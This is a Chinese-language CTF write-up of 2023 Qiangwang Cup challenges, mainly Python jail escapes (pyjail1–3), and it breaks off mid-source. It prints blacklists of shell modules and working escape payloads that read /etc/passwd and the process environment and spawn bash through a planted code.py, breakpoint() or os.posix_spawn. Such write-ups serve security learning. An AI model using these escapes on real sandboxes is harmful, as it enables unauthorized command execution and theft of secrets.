解题步骤可参考：<a href="https://boogipop.com/2023/12/18/%E7%AC%AC%E4%B8%83%E5%B1%8A%20%E5%BC%BA%E7%BD%91%E6%9D%AF%20%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Web%20Writeup/#easyphp">第七届 强网杯 全国网络安全挑战赛 Web Writeup - Boogiepop Doesn’t Laugh</a></p>

<p>不太很理解这道题的应用场景🤣，正常情况下 xcache 只会在 /tmp 下。</p>

<p>解题思路如下：</p>
<ol>
  <li>找出 libphp 基地址，然后根据该地址修复 xcache 文件中的函数指针，使得该文件可以被本地正常加载。</li>
  <li>加载起来后使用 xdebug trace 日志辅助分析代码运行流程。</li>
</ol>

<p>记录一下 xcache 环境的搭建过程。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://xcache.lighttpd.net/pub/Releases/3.2.0/xcache-3.2.0.tar.gz
<span class="nb">tar </span>zxvf xcache-3.2.0.tar.gz
<span class="nb">cd </span>xcache-3.2.0
phpize
./configure <span class="nt">--enable-xcache</span> <span class="nt">--enable-xcache-encoder</span> <span class="nt">--enable-xcache-decoder</span> <span class="nt">--enable-xcache-assembler</span> <span class="nt">--enable-xcache-disassembler</span> <span class="nt">--with-php-config</span><span class="o">=</span>/usr/bin/php-config
make &amp; make <span class="nb">install</span>
</code></pre></div></div>
<p>但我本地一直没有自动生成该 mmap 文件，手动创建该文件后权限设定为 777，重启后可以生成。</p>

<h1 id="misc">MISC</h1>

<h2 id="pyjail1">pyjail1</h2>
<p>题目源码如下：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">code</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">subprocess</span>
<span class="kn">import</span> <span class="n">pty</span>
<span class="k">def</span> <span class="nf">blacklist_fun_callback</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Player! It</span><span class="sh">'</span><span class="s">s already banned!</span><span class="sh">"</span><span class="p">)</span>

<span class="n">pty</span><span class="p">.</span><span class="n">spawn</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="n">os</span><span class="p">.</span><span class="n">system</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="n">os</span><span class="p">.</span><span class="n">popen</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="n">subprocess</span><span class="p">.</span><span class="n">call</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="n">code</span><span class="p">.</span><span class="n">interact</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="n">code</span><span class="p">.</span><span class="n">compile_command</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>

<span class="nb">vars</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="n">attr</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="nb">dir</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="nb">getattr</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="k">exec</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="nb">__import__</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="nb">compile</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="n">breakpoint</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>

<span class="k">del</span> <span class="n">os</span><span class="p">,</span> <span class="n">subprocess</span><span class="p">,</span> <span class="n">code</span><span class="p">,</span> <span class="n">pty</span><span class="p">,</span> <span class="n">blacklist_fun_callback</span>
<span class="n">input_code</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Can u input your code to escape &gt; </span><span class="sh">"</span><span class="p">)</span>

<span class="n">blacklist_words</span> <span class="o">=</span> <span class="p">[</span>
    <span class="sh">"</span><span class="s">subprocess</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">os</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">code</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">interact</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">pty</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">pdb</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">platform</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">importlib</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">timeit</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">imp</span><span class="sh">"</span><span class="p">,</span> 
    <span class="sh">"</span><span class="s">commands</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">popen</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">load_module</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">spawn</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">flag</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">eval</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">exec</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">compile</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">vars</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">attr</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">dir</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">getattr</span><span class="sh">"</span>
    <span class="sh">"</span><span class="s">__import__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__builtins__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__getattribute__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__class__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__base__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__subclasses__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__getitem__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__self__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__globals__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__init__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__name__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__dict__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">._module</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">builtins</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">breakpoint</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">import</span><span class="sh">"</span><span class="p">,</span>
<span class="p">]</span>

<span class="k">def</span> <span class="nf">my_filter</span><span class="p">(</span><span class="n">input_code</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">blacklist_words</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">input_code</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">False</span>
    <span class="k">return</span> <span class="bp">True</span>

<span class="k">while</span> <span class="sh">'</span><span class="s">{</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">input_code</span> <span class="ow">and</span> <span class="sh">'</span><span class="s">}</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">input_code</span> <span class="ow">and</span> <span class="n">input_code</span><span class="p">.</span><span class="nf">isascii</span><span class="p">()</span> <span class="ow">and</span> <span class="nf">my_filter</span><span class="p">(</span><span class="n">input_code</span><span class="p">)</span> <span class="ow">and</span> <span class="sh">"</span><span class="s">eval</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">input_code</span> <span class="ow">and</span> <span class="nf">len</span><span class="p">(</span><span class="n">input_code</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">65</span><span class="p">:</span>
    <span class="n">input_code</span> <span class="o">=</span> <span class="nf">eval</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">f</span><span class="sh">'</span><span class="si">{</span><span class="n">input_code</span><span class="si">}</span><span class="sh">'"</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Player! Please obey the filter rules which I set!</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<p>题目主要设置了几个防护：</p>
<ol>
  <li>将一些敏感函数使用 blacklist_fun_callback 进行覆盖。
    <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     <span class="n">pty</span><span class="p">.</span><span class="n">spawn</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="n">os</span><span class="p">.</span><span class="n">system</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="n">os</span><span class="p">.</span><span class="n">popen</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="n">subprocess</span><span class="p">.</span><span class="n">call</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="n">code</span><span class="p">.</span><span class="n">interact</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="n">code</span><span class="p">.</span><span class="n">compile_command</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
</code></pre></div>    </div>
  </li>
  <li>将一些 builtins 中的函数进行覆盖：
    <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     <span class="nb">vars</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="n">attr</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="nb">dir</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="nb">getattr</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="k">exec</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="nb">__import__</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="nb">compile</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="n">breakpoint</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
</code></pre></div>    </div>
  </li>
  <li>删除了 os, subprocess, code, pty 库。</li>
  <li>设置了一个黑名单 blacklist_words，过滤了一些敏感的函数名，但没有过滤 open、write 等文件操作函数。（help 也没有过滤，但进入文档后无法输入 :）</li>
  <li>控制输入的长度为 65 以下，并且只能输入 ascii 字符，unicode 就用不了了。</li>
  <li>最后通过 f string 来执行代码。</li>
</ol>

<p>由于没有过滤 open 函数，我们可以直接读取文件内容：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nf">print</span><span class="p">(</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/etc/passwd</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">())}</span>
</code></pre></div></div>
<p>读取 /proc/self/environ 时可以读取到 flag。</p>

<h2 id="pyjail2">pyjail2</h2>
<h3 id="解法-1写文件">解法 1：写文件</h3>
<p>pyjail2 的源代码没有变，但 flag 值不在 /proc/self/environ 中了。由于 write 函数没有被过滤，我们可以先写入一个 python 文件，然后加载该文件来 getshell。</p>

<p>由于脚本本身加载了 code 模块，我们在当前目录写一个 code.py，再次运行该脚本时，就会加载我们写入的 code.py，如果我们写入下面的内容，就可以直接获取 shell。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__import__<span class="o">(</span><span class="s1">'os'</span><span class="o">)</span>.system<span class="o">(</span><span class="s2">"bash"</span><span class="o">)</span>
</code></pre></div></div>

<p>由于限制了输入长度不能够超过 64，因此我们需要切分写入，例如：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span>open<span class="o">(</span><span class="s2">"a"</span>,<span class="s2">"w"</span><span class="o">)</span>.write<span class="o">(</span><span class="s2">"__im"</span><span class="o">)}</span>
<span class="o">{</span>open<span class="o">(</span><span class="s2">"a"</span>,<span class="s2">"a"</span><span class="o">)</span>.write<span class="o">(</span><span class="s2">"port_"</span><span class="o">)}</span>
</code></pre></div></div>
<p>注意，当我们需要写入含有单引号的字符时，如果直接使用 <code class="language-plaintext highlighter-rouge">{open("a","a").write("_('o")}</code> 会出现报错:</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Traceback </span><span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
  <span class="n">File</span> <span class="sh">"</span><span class="s">&lt;string&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
  <span class="n">File</span> <span class="sh">"</span><span class="s">&lt;string&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span>
    <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">).</span><span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s">s</span><span class="sh">'"</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span>
                              <span class="o">^</span>
<span class="nb">SyntaxError</span><span class="p">:</span> <span class="n">unterminated</span> <span class="n">string</span> <span class="nf">literal </span><span class="p">(</span><span class="n">detected</span> <span class="n">at</span> <span class="n">line</span> <span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>
<p>这是由于经过外层的 f string 之后，eval 执行的是如下的字符串，由于单引号没有闭合，所以无法执行，但我们加入反斜杠后，又会出现下面的错误，f-string 表达式部分不能包含反斜杠。</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span><span class="o">-</span><span class="n">string</span> <span class="n">expression</span> <span class="n">part</span> <span class="n">cannot</span> <span class="n">include</span> <span class="n">a</span> <span class="n">backslash</span>
</code></pre></div></div>
<p>但实际我们可以直接闭合掉两头的字符串，避免受到 f-string 的限制：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">输入</span><span class="err">：</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">).write(</span><span class="sh">"</span><span class="s">s</span><span class="sh">'"</span><span class="s">),</span><span class="sh">'</span><span class="s">
拼接后为：eval(</span><span class="sh">'</span><span class="s">f</span><span class="se">\'\'</span><span class="s">,open(</span><span class="sh">"</span><span class="n">a</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="n">a</span><span class="sh">"</span><span class="s">).write(</span><span class="sh">"</span><span class="n">s</span>\<span class="sh">'"</span><span class="s">),</span><span class="se">\'\'</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>
<p>将 payload 写入文件 a 后，可以将内容写入 code.py，由于 code 也被过滤了，所以可以通过字符串拼接来绕过：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">'</span><span class="n">cod</span><span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="n">e</span><span class="p">.</span><span class="n">py</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="n">w</span><span class="sh">'</span><span class="s">).write(open(</span><span class="sh">'</span><span class="n">a</span><span class="sh">'</span><span class="s">).read()),</span><span class="sh">'</span>
</code></pre></div></div>
<p>写入 code.py 后，再加载一次即可进入 bash。</p>

<p>完整 exp：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">).</span><span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s">__im</span><span class="sh">"</span><span class="p">)}</span>
<span class="p">{</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">).</span><span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s">port_</span><span class="sh">"</span><span class="p">)}</span>
<span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">).write(</span><span class="sh">"</span><span class="s">_(</span><span class="sh">'</span><span class="n">o</span><span class="sh">"</span><span class="s">),</span><span class="sh">'</span><span class="s">
{1}</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">"</span><span class="n">a</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="n">a</span><span class="sh">"</span><span class="s">).write(</span><span class="sh">"</span><span class="n">s</span><span class="sh">'</span><span class="s">).syste</span><span class="sh">"</span><span class="s">),</span><span class="sh">'</span>
<span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">).write(</span><span class="sh">"</span><span class="s">m(</span><span class="sh">'</span><span class="n">bash</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span><span class="s">),</span><span class="sh">'</span>
<span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">'</span><span class="n">cod</span><span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="n">e</span><span class="p">.</span><span class="n">py</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="n">w</span><span class="sh">'</span><span class="s">).write(open(</span><span class="sh">'</span><span class="n">a</span><span class="sh">'</span><span class="s">).read()),</span><span class="sh">'</span>
</code></pre></div></div>

<h3 id="解法-2清空-blacklist_words">解法 2：清空 blacklist_words</h3>
<p>该利用手法的思路如果：</p>
<ol>
  <li>将 blacklist_words 置空，然后利用 input() 来绕过长度限制进一步输入内容。</li>
  <li>利用 globals()[<strong>builtins</strong>] 获取到内置模块，从而获取原始的内置函数。</li>
</ol>

<p>具体可参考文章：<a href="http://cn-sec.com/archives/2313588.html">2023 强网杯 Writeup - CN-SEC 中文网</a></p>

<p>全局变量 blacklist_words 可以通过 globals() 获取，下面的 payload 即可将该全局变量清空：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">list</span><span class="p">(</span><span class="nf">globals</span><span class="p">().</span><span class="nf">values</span><span class="p">())[</span><span class="o">-</span><span class="mi">2</span><span class="p">].</span><span class="nf">clear</span><span class="p">()</span>
</code></pre></div></div>
<p>清空之后，就可以使用黑名单的函数了，但由于长度限制，我们可以使得 eval 执行后返回 {input()}，例如：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># {[list(globals().values())[-2].clear(),"(inpu""t())}"][1]} 离谱了，之前把括号写错了。。。下面才是正确的 payload。
</span><span class="p">{[</span><span class="nf">list</span><span class="p">(</span><span class="nf">globals</span><span class="p">().</span><span class="nf">values</span><span class="p">())[</span><span class="o">-</span><span class="mi">2</span><span class="p">].</span><span class="nf">clear</span><span class="p">(),</span><span class="sh">"</span><span class="s">{inpu</span><span class="sh">""</span><span class="s">t()}</span><span class="sh">"</span><span class="p">][</span><span class="mi">1</span><span class="p">]}</span>
<span class="c1"># input_code = eval(f"f'{input_code}'") 后可以得到 {input()}
</span></code></pre></div></div>
<p>由于 while 循环的存在，会再次进入 eval，执行 eval(“f’{input()}’”) 会打开输入。</p>

<p>由于 blacklist_fun_callback 仅仅覆盖的是当前命名空间中的 breakpoint 函数，我们可以通过 <code class="language-plaintext highlighter-rouge">globals()["__builtins__"]</code> 获取到原始的 builtins 函数。因此我们再传入下面的 payload 即可打开 breakpoint 的 Pdb 交互式命令行.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nf">globals</span><span class="p">()[</span><span class="sh">"</span><span class="s">__builtins__</span><span class="sh">"</span><span class="p">].</span><span class="nf">breakpoint</span><span class="p">()}</span>
</code></pre></div></div>
<p>进入命令行后，可以通过 os.listdir 或者 glob.glob 方法列目录。</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
<span class="n">os</span><span class="p">.</span><span class="nf">listdir</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<p>另外，os 模块除了 system 以外，还有别的模块也是可以 getshell 的，比如：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">os</span><span class="p">.</span><span class="nf">posix_spawn</span><span class="p">(</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">,</span> <span class="p">[</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">],</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">)</span>
</code></pre></div></div>
<p>方法多多，具体可参考我此前的博客：<a href="https://dummykitty.github.io/python/2023/05/29/python-沙箱逃逸原理.html">CTF Pyjail 沙箱逃逸原理合集</a></p>

<h2 id="pyjail3">pyjail3</h2>
<p>这道题涉及到了 AST 绕过，但限制非常死，源码如下：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">ast</span>

<span class="n">BAD_ATS</span> <span class="o">=</span> <span class="p">{</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">Attribute</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">Subscript</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">comprehension</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">Delete</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">Try</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">For</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">ExceptHandler</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">With</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">Import</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">ImportFrom</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">Assign</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">AnnAssign</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">Constant</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">ClassDef</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">AsyncFunctionDef</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">BUILTINS</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">bool</span><span class="sh">"</span><span class="p">:</span> <span class="nb">bool</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">set</span><span class="sh">"</span><span class="p">:</span> <span class="nb">set</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">tuple</span><span class="sh">"</span><span class="p">:</span> <span class="nb">tuple</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">round</span><span class="sh">"</span><span class="p">:</span> <span class="nb">round</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">map</span><span class="sh">"</span><span class="p">:</span> <span class="nb">map</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">len</span><span class="sh">"</span><span class="p">:</span> <span class="nb">len</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">bytes</span><span class="sh">"</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">dict</span><span class="sh">"</span><span class="p">:</span> <span class="nb">dict</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">str</span><span class="sh">"</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">all</span><span class="sh">"</span><span class="p">:</span> <span class="nb">all</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">range</span><span class="sh">"</span><span class="p">:</span> <span class="nb">range</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">enumerate</span><span class="sh">"</span><span class="p">:</span> <span class="nb">enumerate</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">int</span><span class="sh">"</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">zip</span><span class="sh">"</span><span class="p">:</span> <span class="nb">zip</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">filter</span><span class="sh">"</span><span class="p">:</span> <span class="nb">filter</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">list</span><span class="sh">"</span><span class="p">:</span> <span class="nb">list</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">max</span><span class="sh">"</span><span class="p">:</span> <span class="nb">max</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">float</span><span class="sh">"</span><span class="p">:</span> <span class="nb">float</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">divmod</span><span class="sh">"</span><span class="p">:</span> <span class="nb">divmod</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">unicode</span><span class="sh">"</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">min</span><span class="sh">"</span><span class="p">:</span> <span class="nb">min</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">range</span><span class="sh">"</span><span class="p">:</span> <span class="nb">range</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">sum</span><span class="sh">"</span><span class="p">:</span> <span class="nb">sum</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">abs</span><span class="sh">"</span><span class="p">:</span> <span class="nb">abs</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">sorted</span><span class="sh">"</span><span class="p">:</span> <span class="nb">sorted</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">repr</span><span class="sh">"</span><span class="p">:</span> <span class="nb">repr</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">object</span><span class="sh">"</span><span class="p">:</span> <span class="nb">object</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">isinstance</span><span class="sh">"</span><span class="p">:</span> <span class="nb">isinstance</span>
<span class="p">}</span>



<span class="k">def</span> <span class="nf">is_safe</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
  <span class="k">if</span> <span class="nf">type</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span> <span class="ow">and</span> <span class="sh">"</span><span class="s">__</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
    <span class="k">return</span> <span class="bp">False</span>

  <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ast</span><span class="p">.</span><span class="nf">walk</span><span class="p">(</span><span class="nf">compile</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="sh">"</span><span class="s">&lt;QWB7th&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">exec</span><span class="sh">"</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">ast</span><span class="p">.</span><span class="n">PyCF_ONLY_AST</span><span class="p">)):</span>
    <span class="k">if</span> <span class="nf">type</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="ow">in</span> <span class="n">BAD_ATS</span><span class="p">:</span>
      <span class="k">return</span> <span class="bp">False</span>

  <span class="k">return</span> <span class="bp">True</span>  


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
  <span class="n">user_input</span> <span class="o">=</span> <span class="sh">""</span>
  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">line</span> <span class="o">=</span> <span class="nf">input</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">line</span> <span class="o">==</span> <span class="sh">""</span><span class="p">:</span>
      <span class="k">break</span>
    <span class="n">user_input</span> <span class="o">+=</span> <span class="n">line</span>
